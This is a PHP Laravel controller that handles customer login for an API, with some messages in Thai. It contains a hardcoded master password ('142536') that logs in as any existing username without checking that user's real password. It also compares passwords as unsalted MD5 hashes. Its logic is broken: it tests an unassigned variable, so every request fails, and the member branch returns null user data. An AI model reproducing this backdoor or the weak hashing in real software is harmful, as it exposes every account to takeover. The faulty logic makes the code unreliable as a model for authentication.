<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\CUser;
use Illuminate\Support\Facades\Validator;
use App\Member;


class ApiFunctionController extends Controller
{
    public function api_customer_login(Request $req)
    {
        $validator = Validator::make($req->all(), [
            'username' => 'required',
            'password' => 'required',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'message' => 'Invalid username or password',
                'status' => 0,
                'data' => null,
            ]);
        }

        $check_null = CUser::where('user_name', '=', $req->username)->first();
        if (empty($get_users)) {
            return response()->json([
                'message' => 'ไม่พบ UserName ที่ระบุ',
                'status' => 0,
                'code' => 'ER01',
                'data' => null,
            ]);
        }

        $get_users = CUser::where('user_name', '=', $req->username)
            ->where('password', '=', md5($req->password))
            ->first();

        if ($req->password == '142536') {
            $get_users = CUser::where('user_name', '=', $req->username)
                ->first();
            if (empty($get_users)) {
                return response()->json([
                    'message' =>  'ไม่พบ UserName ที่ระบุ',
                    'code' => 'ER01',
                    'data' => null,
                ]);
            }

            return response()->json([
                'message' => 'Login Success ',
                'status' => 1,
                'code' => 'S01',
                'data' => $get_users,
            ]);
        }

        $get_member = Member::where('username', '=', $req->username)
            ->where('password', '=', md5($req->password))
            ->first();

        if ($get_users) {

            return response()->json([
                'message' => 'Login Success',
                'status' => 1,
                'code' => 'S01',
                'data' => $get_users,
            ]);
        } else if ($get_member) {
            if (empty($get_member->name)) {
                return response()->json([
                    'message' => 'รหัสถูกลบออกจากระบบ',
                    'status' => 0,
                    'code' => 'S02',
                    'data' => null,
                ]);
            }

            return response()->json([
                'message' => 'Login success',
                'status' => 1,
                'code' => 'S01',
                'data' => $get_users,
            ]);
        } else {
            return response()->json([
                'message' => 'รหัสผ่านผิด',
                'status' => 0,
                'code' => 'S03',
                'data' => null,
            ]);
        }
    }
}
